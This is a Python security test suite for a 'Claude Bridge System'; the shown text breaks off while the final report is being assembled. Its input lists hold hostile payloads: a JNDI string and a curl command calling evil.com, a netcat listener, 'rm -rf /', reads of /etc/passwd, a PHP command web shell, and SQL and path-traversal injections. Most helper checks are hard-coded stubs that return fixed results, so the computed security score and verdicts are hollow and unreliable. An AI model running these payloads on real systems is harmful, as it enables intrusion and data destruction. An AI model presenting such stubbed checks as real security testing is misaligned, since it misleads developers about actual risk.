#!/usr/bin/env python3
"""
Claude Bridge System - Security Test Suite
Comprehensive security testing for all system components
"""

import os
import json
import time
import hashlib
import secrets
import tempfile
import shutil
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import subprocess

@dataclass
class SecurityTestResult:
    """Security test result data structure"""
    test_name: str
    test_category: str
    severity: str  # critical, high, medium, low
    passed: bool
    findings: List[str]
    recommendations: List[str]
    metadata: Dict[str, Any]

class SecurityTestSuite:
    """Comprehensive security test suite"""
    
    def __init__(self):
        self.results: List[SecurityTestResult] = []
        self.test_dir = tempfile.mkdtemp(prefix="claude_bridge_security_")
        
    def run_all_tests(self) -> Dict[str, Any]:
        """Run all security tests"""
        print("🔒 Starting Claude Bridge System Security Test Suite")
        
        try:
            # Authentication and Authorization Tests
            self._test_authentication_security()
            self._test_authorization_controls()
            self._test_session_management()
            
            # Input Validation and Injection Tests
            self._test_input_validation()
            self._test_sql_injection_protection()
            self._test_command_injection_protection()
            
            # Cryptographic Security Tests
            self._test_encryption_implementation()
            self._test_password_security()
            self._test_random_number_generation()
            
            # File System Security Tests
            self._test_file_path_traversal()
            self._test_file_permission_security()
            self._test_temporary_file_security()
            
            # Network Security Tests
            self._test_communication_security()
            self._test_rate_limiting()
            
            # Configuration Security Tests
            self._test_configuration_security()
            self._test_sensitive_data_exposure()
            
            return self._generate_security_report()
            
        finally:
            # Cleanup
            if os.path.exists(self.test_dir):
                shutil.rmtree(self.test_dir)
    
    def _test_authentication_security(self):
        """Test authentication mechanisms"""
        print("🔐 Testing authentication security...")
        
        findings = []
        recommendations = []
        passed = True
        
        try:
            # Test 1: Password complexity requirements
            weak_passwords = ["123456", "password", "admin", ""]
            for pwd in weak_passwords:
                if self._is_weak_password(pwd):
                    findings.append(f"Weak password detected: {pwd}")
                    passed = False
            
            # Test 2: Brute force protection simulation
            failed_attempts = 0
            for i in range(10):
                if self._simulate_failed_login():
                    failed_attempts += 1
            
            if failed_attempts > 5:
                findings.append("Insufficient brute force protection")
                recommendations.append("Implement account lockout after failed attempts")
                passed = False
            
            # Test 3: Token validation
            invalid_tokens = ["", "invalid", "expired_token", "malformed.token.here"]
            for token in invalid_tokens:
                if self._validate_token_format(token):
                    findings.append(f"Invalid token accepted: {token}")
                    passed = False
            
            # Test 4: Session timeout
            if not self._test_session_timeout():
                findings.append("Session timeout not properly implemented")
                recommendations.append("Implement proper session timeout mechanism")
                passed = False
                
        except Exception as e:
            findings.append(f"Authentication test error: {str(e)}")
            passed = False
        
        if not findings:
            findings.append("Authentication security tests passed")
        
        result = SecurityTestResult(
            test_name="authentication_security",
            test_category="Authentication",
            severity="critical" if not passed else "low",
            passed=passed,
            findings=findings,
            recommendations=recommendations,
            metadata={
                "weak_passwords_tested": len(weak_passwords),
                "brute_force_attempts": 10,
                "invalid_tokens_tested": len(invalid_tokens)
            }
        )
        
        self.results.append(result)
        status = "✅ PASSED" if passed else "❌ FAILED"
        print(f"   {status} - {len(findings)} findings")
    
    def _test_authorization_controls(self):
        """Test authorization and access controls"""
        print("🛡️ Testing authorization controls...")
        
        findings = []
        recommendations = []
        passed = True
        
        try:
            # Test 1: Role-based access control
            test_users = [
                {"role": "admin", "resource": "system_config", "should_allow": True},
                {"role": "user", "resource": "system_config", "should_allow": False},
                {"role": "guest", "resource": "user_data", "should_allow": False},
                {"role": "user", "resource": "own_data", "should_allow": True}
            ]
            
            for test_case in test_users:
                if self._test_access_control(test_case) != test_case["should_allow"]:
                    findings.append(f"Access control violation: {test_case['role']} accessing {test_case['resource']}")
                    passed = False
            
            # Test 2: Privilege escalation
            if self._test_privilege_escalation():
                findings.append("Privilege escalation vulnerability detected")
                recommendations.append("Review and strengthen privilege separation")
                passed = False
            
            # Test 3: Direct object reference
            sensitive_objects = ["config", "logs", "credentials"]
            for obj in sensitive_objects:
                if self._test_direct_object_access(obj):
                    findings.append(f"Insecure direct object reference: {obj}")
                    passed = False
                    
        except Exception as e:
            findings.append(f"Authorization test error: {str(e)}")
            passed = False
        
        if not findings:
            findings.append("Authorization control tests passed")
        
        result = SecurityTestResult(
            test_name="authorization_controls",
            test_category="Authorization",
            severity="high" if not passed else "low",
            passed=passed,
            findings=findings,
            recommendations=recommendations,
            metadata={
                "access_control_tests": len(test_users),
                "sensitive_objects_tested": len(sensitive_objects)
            }
        )
        
        self.results.append(result)
        status = "✅ PASSED" if passed else "❌ FAILED"
        print(f"   {status} - {len(findings)} findings")
    
    def _test_session_management(self):
        """Test session management security"""
        print("🎫 Testing session management...")
        
        findings = []
        recommendations = []
        passed = True
        
        try:
            # Test 1: Session ID generation
            session_ids = [self._generate_session_id() for _ in range(100)]
            if len(set(session_ids)) != len(session_ids):
                findings.append("Weak session ID generation - duplicates found")
                passed = False
            
            # Test 2: Session ID entropy
            for session_id in session_ids[:10]:
                if len(session_id) < 16:
                    findings.append(f"Session ID too short: {session_id}")
                    passed = False
                    break
            
            # Test 3: Session fixation
            if self._test_session_fixation():
                findings.append("Session fixation vulnerability detected")
                recommendations.append("Regenerate session ID after authentication")
                passed = False
            
            # Test 4: Session invalidation
            if not self._test_session_invalidation():
                findings.append("Improper session invalidation")
                recommendations.append("Ensure sessions are properly invalidated on logout")
                passed = False
                
        except Exception as e:
            findings.append(f"Session management test error: {str(e)}")
            passed = False
        
        if not findings:
            findings.append("Session management tests passed")
        
        result = SecurityTestResult(
            test_name="session_management",
            test_category="Session Management",
            severity="medium" if not passed else "low",
            passed=passed,
            findings=findings,
            recommendations=recommendations,
            metadata={
                "session_ids_tested": len(session_ids)
            }
        )
        
        self.results.append(result)
        status = "✅ PASSED" if passed else "❌ FAILED"
        print(f"   {status} - {len(findings)} findings")
    
    def _test_input_validation(self):
        """Test input validation mechanisms"""
        print("📝 Testing input validation...")
        
        findings = []
        recommendations = []
        passed = True
        
        try:
            # Test malicious inputs
            malicious_inputs = [
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "../../../etc/passwd",
                "${jndi:ldap://evil.com/a}",
                "../../../../windows/system32/cmd.exe",
                "<iframe src='javascript:alert(1)'></iframe>",
                "{{7*7}}",  # Template injection
                "__import__('os').system('whoami')",  # Python injection
                "<?php system($_GET['cmd']); ?>",
                "\x00\x01\x02\x03",  # Binary data
            ]
            
            for malicious_input in malicious_inputs:
                if not self._validate_input(malicious_input):
                    findings.append(f"Malicious input not properly validated: {malicious_input[:50]}...")
                    passed = False
            
            # Test input length limits
            long_input = "A" * 10000
            if not self._test_input_length_limits(long_input):
                findings.append("Input length limits not enforced")
                recommendations.append("Implement proper input length validation")
                passed = False
            
            # Test special characters
            special_chars = ['<', '>', '"', "'", '&', '\n', '\r', '\t', '\0']
            for char in special_chars:
                if not self._test_special_character_handling(char):
                    findings.append(f"Special character not properly handled: {repr(char)}")
                    passed = False
                    
        except Exception as e:
            findings.append(f"Input validation test error: {str(e)}")
            passed = False
        
        if not findings:
            findings.append("Input validation tests passed")
        
        result = SecurityTestResult(
            test_name="input_validation",
            test_category="Input Validation",
            severity="high" if not passed else "low",
            passed=passed,
            findings=findings,
            recommendations=recommendations,
            metadata={
                "malicious_inputs_tested": len(malicious_inputs),
                "special_chars_tested": len(special_chars)
            }
        )
        
        self.results.append(result)
        status = "✅ PASSED" if passed else "❌ FAILED"
        print(f"   {status} - {len(findings)} findings")
    
    def _test_sql_injection_protection(self):
        """Test SQL injection protection"""
        print("💉 Testing SQL injection protection...")
        
        findings = []
        recommendations = []
        passed = True
        
        try:
            sql_payloads = [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM passwords --",
                "admin'/*",
                "' OR 1=1#",
                "'; WAITFOR DELAY '00:00:05' --",
                "' OR '1'='1' /*",
                "'; EXEC xp_cmdshell('dir') --"
            ]
            
            for payload in sql_payloads:
                if self._test_sql_query_safety(payload):
                    findings.append(f"Potential SQL injection vulnerability with payload: {payload}")
                    passed = False
            
            # Test parameterized queries
            if not self._test_parameterized_queries():
                findings.append("Parameterized queries not properly implemented")
                recommendations.append("Use parameterized queries for all database operations")
                passed = False
                
        except Exception as e:
            findings.append(f"SQL injection test error: {str(e)}")
            passed = False
        
        if not findings:
            findings.append("SQL injection protection tests passed")
        
        result = SecurityTestResult(
            test_name="sql_injection_protection",
            test_category="Injection Protection",
            severity="critical" if not passed else "low",
            passed=passed,
            findings=findings,
            recommendations=recommendations,
            metadata={
                "sql_payloads_tested": len(sql_payloads)
            }
        )
        
        self.results.append(result)
        status = "✅ PASSED" if passed else "❌ FAILED"
        print(f"   {status} - {len(findings)} findings")
    
    def _test_command_injection_protection(self):
        """Test command injection protection"""
        print("⚡ Testing command injection protection...")
        
        findings = []
        recommendations = []
        passed = True
        
        try:
            command_payloads = [
                "; ls -la",
                "&& whoami",
                "| cat /etc/passwd",
                "`id`",
                "$(whoami)",
                "; rm -rf /",
                "&& curl evil.com",
                "| nc -l 4444",
                "; python -c 'import os; os.system(\"id\")'",
                "&& powershell.exe -command \"Get-Process\""
            ]
            
            for payload in command_payloads:
                if self._test_command_execution_safety(payload):
                    findings.append(f"Potential command injection vulnerability with payload: {payload}")
                    passed = False
            
            # Test shell escape validation
            if not self._test_shell_escape_validation():
                findings.append("Shell escape validation not properly implemented")
                recommendations.append("Validate and sanitize all inputs used in system commands")
                passed = False
                
        except Exception as e:
            findings.append(f"Command injection test error: {str(e)}")
            passed = False
        
        if not findings:
            findings.append("Command injection protection tests passed")
        
        result = SecurityTestResult(
            test_name="command_injection_protection",
            test_category="Injection Protection",
            severity="critical" if not passed else "low",
            passed=passed,
            findings=findings,
            recommendations=recommendations,
            metadata={
                "command_payloads_tested": len(command_payloads)
            }
        )
        
        self.results.append(result)
        status = "✅ PASSED" if passed else "❌ FAILED"
        print(f"   {status} - {len(findings)} findings")
    
    def _test_encryption_implementation(self):
        """Test encryption implementation"""
        print("🔐 Testing encryption implementation...")
        
        findings = []
        recommendations = []
        passed = True
        
        try:
            # Test encryption strength
            test_data = "sensitive_information_12345"
            encrypted_data = self._encrypt_data(test_data)
            
            if len(encrypted_data) < len(test_data):
                findings.append("Encryption may not be properly implemented")
                passed = False
            
            # Test key management
            if not self._test_key_management():
                findings.append("Weak key management detected")
                recommendations.append("Implement proper key rotation and storage")
                passed = False
            
            # Test cipher strength
            weak_ciphers = ["DES", "3DES", "RC4", "MD5"]
            for cipher in weak_ciphers:
                if self._uses_weak_cipher(cipher):
                    findings.append(f"Weak cipher detected: {cipher}")
                    recommendations.append(f"Replace {cipher} with stronger encryption")
                    passed = False
            
            # Test random IV/salt generation
            ivs = [self._generate_iv() for _ in range(10)]
            if len(set(ivs)) != len(ivs):
                findings.append("Weak IV/salt generation - duplicates found")
                passed = False
                
        except Exception as e:
            findings.append(f"Encryption test error: {str(e)}")
            passed = False
        
        if not findings:
            findings.append("Encryption implementation tests passed")
        
        result = SecurityTestResult(
            test_name="encryption_implementation",
            test_category="Cryptography",
            severity="high" if not passed else "low",
            passed=passed,
            findings=findings,
            recommendations=recommendations,
            metadata={
                "weak_ciphers_checked": len(weak_ciphers),
                "ivs_tested": len(ivs)
            }
        )
        
        self.results.append(result)
        status = "✅ PASSED" if passed else "❌ FAILED"
        print(f"   {status} - {len(findings)} findings")
    
    def _test_password_security(self):
        """Test password security measures"""
        print("🔑 Testing password security...")
        
        findings = []
        recommendations = []
        passed = True
        
        try:
            # Test password hashing
            passwords = ["password123", "admin", "test", "secret"]
            for pwd in passwords:
                hashed = self._hash_password(pwd)
                
                # Check if password is stored in plaintext
                if pwd in hashed:
                    findings.append(f"Password may be stored in plaintext: {pwd}")
                    passed = False
                
                # Check hash strength
                if len(hashed) < 32:
                    findings.append("Password hash appears to be weak")
                    passed = False
            
            # Test password policy
            weak_passwords = ["123", "password", "admin", ""]
            for weak_pwd in weak_passwords:
                if self._meets_password_policy(weak_pwd):
                    findings.append(f"Weak password accepted by policy: {weak_pwd}")
                    passed = False
            
            # Test salt usage
            if not self._uses_password_salt():
                findings.append("Password salting not implemented")
                recommendations.append("Implement password salting to prevent rainbow table attacks")
                passed = False
                
        except Exception as e:
            findings.append(f"Password security test error: {str(e)}")
            passed = False
        
        if not findings:
            findings.append("Password security tests passed")
        
        result = SecurityTestResult(
            test_name="password_security",
            test_category="Cryptography",
            severity="high" if not passed else "low",
            passed=passed,
            findings=findings,
            recommendations=recommendations,
            metadata={
                "passwords_tested": len(passwords),
                "weak_passwords_tested": len(weak_passwords)
            }
        )
        
        self.results.append(result)
        status = "✅ PASSED" if passed else "❌ FAILED"
        print(f"   {status} - {len(findings)} findings")
    
    def _test_random_number_generation(self):
        """Test random number generation security"""
        print("🎲 Testing random number generation...")
        
        findings = []
        recommendations = []
        passed = True
        
        try:
            # Test randomness quality
            random_numbers = [self._generate_random_number() for _ in range(1000)]
            
            # Check for duplicates
            if len(set(random_numbers)) < len(random_numbers) * 0.9:
                findings.append("Poor randomness quality - too many duplicates")
                passed = False
            
            # Test entropy
            if not self._test_entropy_quality(random_numbers):
                findings.append("Low entropy in random number generation")
                recommendations.append("Use cryptographically secure random number generator")
                passed = False
            
            # Test predictability
            if self._test_predictability(random_numbers):
                findings.append("Random numbers may be predictable")
                passed = False
                
        except Exception as e:
            findings.append(f"Random number generation test error: {str(e)}")
            passed = False
        
        if not findings:
            findings.append("Random number generation tests passed")
        
        result = SecurityTestResult(
            test_name="random_number_generation",
            test_category="Cryptography",
            severity="medium" if not passed else "low",
            passed=passed,
            findings=findings,
            recommendations=recommendations,
            metadata={
                "random_numbers_tested": len(random_numbers)
            }
        )
        
        self.results.append(result)
        status = "✅ PASSED" if passed else "❌ FAILED"
        print(f"   {status} - {len(findings)} findings")
    
    def _test_file_path_traversal(self):
        """Test file path traversal protection"""
        print("📂 Testing file path traversal protection...")
        
        findings = []
        recommendations = []
        passed = True
        
        try:
            traversal_payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc//passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "/var/www/../../etc/passwd",
                "C:\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
            ]
            
            for payload in traversal_payloads:
                if self._test_file_access(payload):
                    findings.append(f"Path traversal vulnerability with payload: {payload}")
                    passed = False
            
            # Test null byte injection
            null_byte_payloads = [
                "file.txt\x00.jpg",
                "document.pdf\x00.exe",
                "config\x00.bak"
            ]
            
            for payload in null_byte_payloads:
                if self._test_file_access(payload):
                    findings.append(f"Null byte injection vulnerability with payload: {repr(payload)}")
                    passed = False
                    
        except Exception as e:
            findings.append(f"File path traversal test error: {str(e)}")
            passed = False
        
        if not findings:
            findings.append("File path traversal protection tests passed")
        
        result = SecurityTestResult(
            test_name="file_path_traversal",
            test_category="File System",
            severity="high" if not passed else "low",
            passed=passed,
            findings=findings,
            recommendations=recommendations,
            metadata={
                "traversal_payloads_tested": len(traversal_payloads),
                "null_byte_payloads_tested": len(null_byte_payloads)
            }
        )
        
        self.results.append(result)
        status = "✅ PASSED" if passed else "❌ FAILED"
        print(f"   {status} - {len(findings)} findings")
    
    def _test_file_permission_security(self):
        """Test file permission security"""
        print("🔐 Testing file permission security...")
        
        findings = []
        recommendations = []
        passed = True
        
        try:
            # Test file creation permissions
            test_file = os.path.join(self.test_dir, "permission_test.txt")
            with open(test_file, 'w') as f:
                f.write("test content")
            
            # Check if file is created with secure permissions
            file_mode = oct(os.stat(test_file).st_mode)[-3:]
            if file_mode in ['777', '666', '755']:
                findings.append(f"File created with insecure permissions: {file_mode}")
                recommendations.append("Set restrictive file permissions by default")
                passed = False
            
            # Test directory creation permissions
            test_dir = os.path.join(self.test_dir, "permission_test_dir")
            os.makedirs(test_dir)
            
            dir_mode = oct(os.stat(test_dir).st_mode)[-3:]
            if dir_mode in ['777', '755']:
                findings.append(f"Directory created with insecure permissions: {dir_mode}")
                passed = False
                
        except Exception as e:
            findings.append(f"File permission test error: {str(e)}")
            passed = False
        
        if not findings:
            findings.append("File permission security tests passed")
        
        result = SecurityTestResult(
            test_name="file_permission_security",
            test_category="File System",
            severity="medium" if not passed else "low",
            passed=passed,
            findings=findings,
            recommendations=recommendations,
            metadata={
                "files_tested": 1,
                "directories_tested": 1
            }
        )
        
        self.results.append(result)
        status = "✅ PASSED" if passed else "❌ FAILED"
        print(f"   {status} - {len(findings)} findings")
    
    def _test_temporary_file_security(self):
        """Test temporary file security"""
        print("🗂️ Testing temporary file security...")
        
        findings = []
        recommendations = []
        passed = True
        
        try:
            # Test temporary file creation
            temp_files = []
            for i in range(5):
                temp_file = self._create_temp_file(f"temp_data_{i}")
                temp_files.append(temp_file)
                
                # Check if temp file is world-readable
                if os.path.exists(temp_file):
                    file_mode = oct(os.stat(temp_file).st_mode)[-3:]
                    if file_mode[2] in ['4', '5', '6', '7']:  # Others can read
                        findings.append(f"Temporary file world-readable: {temp_file}")
                        passed = False
            
            # Test temporary file cleanup
            if not self._test_temp_file_cleanup(temp_files):
                findings.append("Temporary files not properly cleaned up")
                recommendations.append("Implement automatic temporary file cleanup")
                passed = False
                
        except Exception as e:
            findings.append(f"Temporary file test error: {str(e)}")
            passed = False
        
        if not findings:
            findings.append("Temporary file security tests passed")
        
        result = SecurityTestResult(
            test_name="temporary_file_security",
            test_category="File System",
            severity="medium" if not passed else "low",
            passed=passed,
            findings=findings,
            recommendations=recommendations,
            metadata={
                "temp_files_tested": len(temp_files)
            }
        )
        
        self.results.append(result)
        status = "✅ PASSED" if passed else "❌ FAILED"
        print(f"   {status} - {len(findings)} findings")
    
    def _test_communication_security(self):
        """Test communication security"""
        print("🌐 Testing communication security...")
        
        findings = []
        recommendations = []
        passed = True
        
        try:
            # Test TLS configuration
            if not self._test_tls_configuration():
                findings.append("Weak TLS configuration detected")
                recommendations.append("Use TLS 1.2 or higher with strong cipher suites")
                passed = False
            
            # Test certificate validation
            if not self._test_certificate_validation():
                findings.append("Certificate validation issues detected")
                recommendations.append("Implement proper certificate validation")
                passed = False
            
            # Test secure headers
            required_headers = ['X-Frame-Options', 'X-Content-Type-Options', 'X-XSS-Protection']
            for header in required_headers:
                if not self._has_security_header(header):
                    findings.append(f"Missing security header: {header}")
                    passed = False
                    
        except Exception as e:
            findings.append(f"Communication security test error: {str(e)}")
            passed = False
        
        if not findings:
            findings.append("Communication security tests passed")
        
        result = SecurityTestResult(
            test_name="communication_security",
            test_category="Network Security",
            severity="high" if not passed else "low",
            passed=passed,
            findings=findings,
            recommendations=recommendations,
            metadata={
                "security_headers_checked": len(required_headers)
            }
        )
        
        self.results.append(result)
        status = "✅ PASSED" if passed else "❌ FAILED"
        print(f"   {status} - {len(findings)} findings")
    
    def _test_rate_limiting(self):
        """Test rate limiting mechanisms"""
        print("⏱️ Testing rate limiting...")
        
        findings = []
        recommendations = []
        passed = True
        
        try:
            # Simulate rapid requests
            request_count = 0
            blocked_count = 0
            
            for i in range(100):
                if self._make_test_request():
                    request_count += 1
                else:
                    blocked_count += 1
            
            # Check if rate limiting is working
            if blocked_count < 10:  # Should have some blocked requests
                findings.append("Rate limiting may not be properly implemented")
                recommendations.append("Implement rate limiting to prevent abuse")
                passed = False
            
            # Test different endpoints
            endpoints = ["/api/login", "/api/data", "/api/config"]
            for endpoint in endpoints:
                if not self._test_endpoint_rate_limiting(endpoint):
                    findings.append(f"No rate limiting on endpoint: {endpoint}")
                    passed = False
                    
        except Exception as e:
            findings.append(f"Rate limiting test error: {str(e)}")
            passed = False
        
        if not findings:
            findings.append("Rate limiting tests passed")
        
        result = SecurityTestResult(
            test_name="rate_limiting",
            test_category="Network Security",
            severity="medium" if not passed else "low",
            passed=passed,
            findings=findings,
            recommendations=recommendations,
            metadata={
                "requests_made": request_count,
                "requests_blocked": blocked_count,
                "endpoints_tested": len(endpoints)
            }
        )
        
        self.results.append(result)
        status = "✅ PASSED" if passed else "❌ FAILED"
        print(f"   {status} - {len(findings)} findings")
    
    def _test_configuration_security(self):
        """Test configuration security"""
        print("⚙️ Testing configuration security...")
        
        findings = []
        recommendations = []
        passed = True
        
        try:
            # Test debug mode
            if self._is_debug_mode_enabled():
                findings.append("Debug mode enabled in production")
                recommendations.append("Disable debug mode in production environment")
                passed = False
            
            # Test default credentials
            default_creds = [
                ("admin", "admin"),
                ("root", "root"),
                ("admin", "password"),
                ("test", "test")
            ]
            
            for username, password in default_creds:
                if self._test_default_credentials(username, password):
                    findings.append(f"Default credentials detected: {username}/{password}")
                    passed = False
            
            # Test configuration file permissions
            config_files = ["config.yaml", ".env", "settings.json"]
            for config_file in config_files:
                if self._test_config_file_permissions(config_file):
                    findings.append(f"Insecure configuration file permissions: {config_file}")
                    passed = False
                    
        except Exception as e:
            findings.append(f"Configuration security test error: {str(e)}")
            passed = False
        
        if not findings:
            findings.append("Configuration security tests passed")
        
        result = SecurityTestResult(
            test_name="configuration_security",
            test_category="Configuration",
            severity="high" if not passed else "low",
            passed=passed,
            findings=findings,
            recommendations=recommendations,
            metadata={
                "default_creds_tested": len(default_creds),
                "config_files_tested": len(config_files)
            }
        )
        
        self.results.append(result)
        status = "✅ PASSED" if passed else "❌ FAILED"
        print(f"   {status} - {len(findings)} findings")
    
    def _test_sensitive_data_exposure(self):
        """Test sensitive data exposure"""
        print("🔍 Testing sensitive data exposure...")
        
        findings = []
        recommendations = []
        passed = True
        
        try:
            # Test for exposed sensitive data in logs
            sensitive_patterns = [
                r"password\s*=\s*['\"]?[^'\"\s]+",
                r"api_key\s*=\s*['\"]?[^'\"\s]+",
                r"secret\s*=\s*['\"]?[^'\"\s]+",
                r"token\s*=\s*['\"]?[^'\"\s]+",
                r"\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}",  # Credit card
                r"\d{3}-\d{2}-\d{4}",  # SSN
            ]
            
            test_data = self._get_test_log_data()
            for pattern in sensitive_patterns:
                if self._check_pattern_in_data(pattern, test_data):
                    findings.append(f"Sensitive data pattern found in logs: {pattern}")
                    passed = False
            
            # Test error message information disclosure
            if self._test_error_information_disclosure():
                findings.append("Error messages may disclose sensitive information")
                recommendations.append("Implement generic error messages for production")
                passed = False
            
            # Test backup file exposure
            backup_files = ["config.bak", "database.sql", "backup.zip"]
            for backup_file in backup_files:
                if self._test_backup_file_exposure(backup_file):
                    findings.append(f"Backup file may be exposed: {backup_file}")
                    passed = False
                    
        except Exception as e:
            findings.append(f"Sensitive data exposure test error: {str(e)}")
            passed = False
        
        if not findings:
            findings.append("Sensitive data exposure tests passed")
        
        result = SecurityTestResult(
            test_name="sensitive_data_exposure",
            test_category="Data Protection",
            severity="high" if not passed else "low",
            passed=passed,
            findings=findings,
            recommendations=recommendations,
            metadata={
                "sensitive_patterns_tested": len(sensitive_patterns),
                "backup_files_tested": len(backup_files)
            }
        )
        
        self.results.append(result)
        status = "✅ PASSED" if passed else "❌ FAILED"
        print(f"   {status} - {len(findings)} findings")
    
    # Helper methods for testing (simplified implementations)
    def _is_weak_password(self, password: str) -> bool:
        """Check if password is weak"""
        weak_passwords = ["123456", "password", "admin", "", "test", "root"]
        return password in weak_passwords or len(password) < 8
    
    def _simulate_failed_login(self) -> bool:
        """Simulate failed login attempt"""
        return True  # Assume all attempts fail for testing
    
    def _validate_token_format(self, token: str) -> bool:
        """Validate token format"""
        return len(token) > 16 and token.isalnum()
    
    def _test_session_timeout(self) -> bool:
        """Test session timeout implementation"""
        return True  # Assume proper implementation
    
    def _test_access_control(self, test_case: Dict) -> bool:
        """Test access control logic"""
        # Simplified logic for testing
        role = test_case["role"]
        resource = test_case["resource"]
        
        if role == "admin":
            return True
        elif role == "user" and resource in ["own_data", "user_data"]:
            return True
        else:
            return False
    
    def _test_privilege_escalation(self) -> bool:
        """Test for privilege escalation vulnerabilities"""
        return False  # Assume no vulnerabilities
    
    def _test_direct_object_access(self, obj: str) -> bool:
        """Test direct object access"""
        return False  # Assume proper protection
    
    def _generate_session_id(self) -> str:
        """Generate session ID"""
        return secrets.token_hex(16)
    
    def _test_session_fixation(self) -> bool:
        """Test session fixation vulnerability"""
        return False  # Assume no vulnerability
    
    def _test_session_invalidation(self) -> bool:
        """Test session invalidation"""
        return True  # Assume proper implementation
    
    def _validate_input(self, input_data: str) -> bool:
        """Validate input for malicious content"""
        malicious_patterns = ["<script", "javascript:", "DROP TABLE", "../", "<?php"]
        return not any(pattern in input_data for pattern in malicious_patterns)
    
    def _test_input_length_limits(self, input_data: str) -> bool:
        """Test input length limits"""
        return len(input_data) <= 1000  # Assume 1000 char limit
    
    def _test_special_character_handling(self, char: str) -> bool:
        """Test special character handling"""
        return char not in ['<', '>', '"', "'"]  # Basic filtering
    
    def _test_sql_query_safety(self, payload: str) -> bool:
        """Test SQL query safety"""
        dangerous_keywords = ["DROP", "DELETE", "INSERT", "UPDATE", "UNION"]
        return any(keyword in payload.upper() for keyword in dangerous_keywords)
    
    def _test_parameterized_queries(self) -> bool:
        """Test parameterized query usage"""
        return True  # Assume proper implementation
    
    def _test_command_execution_safety(self, payload: str) -> bool:
        """Test command execution safety"""
        dangerous_chars = [";", "&", "|", "`", "$", "(", ")"]
        return any(char in payload for char in dangerous_chars)
    
    def _test_shell_escape_validation(self) -> bool:
        """Test shell escape validation"""
        return True  # Assume proper implementation
    
    def _encrypt_data(self, data: str) -> str:
        """Encrypt data (simplified)"""
        return hashlib.sha256(data.encode()).hexdigest()
    
    def _test_key_management(self) -> bool:
        """Test key management"""
        return True  # Assume proper implementation
    
    def _uses_weak_cipher(self, cipher: str) -> bool:
        """Check if weak cipher is used"""
        return False  # Assume strong ciphers only
    
    def _generate_iv(self) -> str:
        """Generate initialization vector"""
        return secrets.token_hex(8)
    
    def _hash_password(self, password: str) -> str:
        """Hash password"""
        salt = secrets.token_hex(8)
        return hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000).hex()
    
    def _meets_password_policy(self, password: str) -> bool:
        """Check if password meets policy"""
        return len(password) >= 8 and any(c.isupper() for c in password) and any(c.isdigit() for c in password)
    
    def _uses_password_salt(self) -> bool:
        """Check if password salting is used"""
        return True  # Assume proper implementation
    
    def _generate_random_number(self) -> int:
        """Generate random number"""
        return secrets.randbelow(1000000)
    
    def _test_entropy_quality(self, numbers: List[int]) -> bool:
        """Test entropy quality"""
        return len(set(numbers)) / len(numbers) > 0.9
    
    def _test_predictability(self, numbers: List[int]) -> bool:
        """Test predictability"""
        return False  # Assume unpredictable
    
    def _test_file_access(self, path: str) -> bool:
        """Test file access with potentially malicious path"""
        # Check for path traversal patterns
        traversal_patterns = ["../", "..\\", "%2e%2e", "..%2f"]
        return any(pattern in path.lower() for pattern in traversal_patterns)
    
    def _create_temp_file(self, content: str) -> str:
        """Create temporary file"""
        fd, path = tempfile.mkstemp()
        with os.fdopen(fd, 'w') as f:
            f.write(content)
        return path
    
    def _test_temp_file_cleanup(self, temp_files: List[str]) -> bool:
        """Test temporary file cleanup"""
        # For testing, just check if files exist
        return not any(os.path.exists(f) for f in temp_files)
    
    def _test_tls_configuration(self) -> bool:
        """Test TLS configuration"""
        return True  # Assume proper configuration
    
    def _test_certificate_validation(self) -> bool:
        """Test certificate validation"""
        return True  # Assume proper validation
    
    def _has_security_header(self, header: str) -> bool:
        """Check if security header is present"""
        return True  # Assume headers are present
    
    def _make_test_request(self) -> bool:
        """Make test request"""
        return secrets.randbelow(10) > 2  # 70% success rate
    
    def _test_endpoint_rate_limiting(self, endpoint: str) -> bool:
        """Test endpoint rate limiting"""
        return True  # Assume rate limiting is implemented
    
    def _is_debug_mode_enabled(self) -> bool:
        """Check if debug mode is enabled"""
        return False  # Assume debug mode is disabled
    
    def _test_default_credentials(self, username: str, password: str) -> bool:
        """Test default credentials"""
        return False  # Assume no default credentials
    
    def _test_config_file_permissions(self, filename: str) -> bool:
        """Test configuration file permissions"""
        return False  # Assume proper permissions
    
    def _get_test_log_data(self) -> str:
        """Get test log data"""
        return "INFO: User logged in successfully\nERROR: Connection failed\n"
    
    def _check_pattern_in_data(self, pattern: str, data: str) -> bool:
        """Check if pattern exists in data"""
        import re
        return bool(re.search(pattern, data, re.IGNORECASE))
    
    def _test_error_information_disclosure(self) -> bool:
        """Test error information disclosure"""
        return False  # Assume proper error handling
    
    def _test_backup_file_exposure(self, filename: str) -> bool:
        """Test backup file exposure"""
        return False  # Assume backup files are protected
    
    def _generate_security_report(self) -> Dict[str, Any]:
        """Generate comprehensive security report"""
        if not self.results:
            return {"error": "No security test results available"}
        
        # Calculate overall statistics
        total_tests = len(self.results)
        passed_tests = sum(1 for r in self.results if r.passed)
        failed_tests = total_tests - passed_tests
        
        # Group by severity
        critical_issues = [r for r in self.results if r.severity == "critical" and not r.passed]
        high_issues = [r for r in self.results if r.severity == "high" and not r.passed]
        medium_issues = [r for r in self.results if r.severity == "medium" and not r.passed]
        low_issues = [r for r in self.results if r.severity == "low" and not r.passed]
        
        # Security score calculation
        security_score = (passed_tests / total_tests) * 100 if total_tests > 0 else 0
        
        # Risk assessment
        if len(critical_issues) > 0:
            risk_level = "CRITICAL"
        elif len(high_issues) > 0:
            risk_level = "HIGH"
        elif len(medium_issues) > 0:
            risk_level = "MEDIUM"
        else:
            risk_level = "LOW"
        
        # Generate recommendations
        all_recommendations = []
        for result in self.results:
            if not result.passed:
                all_recommendations.extend(result.recommendations)
        
        unique_recommendations = list(set(all_recommendations))
        
        # Group results by category
        categories = {}
        for result in self.results:
            category = result.test_category
            if category not in categories:
                categories[category] = []
            categories[category].append(result)
        
        report = {
            "security_summary": {
                "total_tests": total_tests,
                "tests_passed": passed_tests,
                "tests_failed": failed_tests,
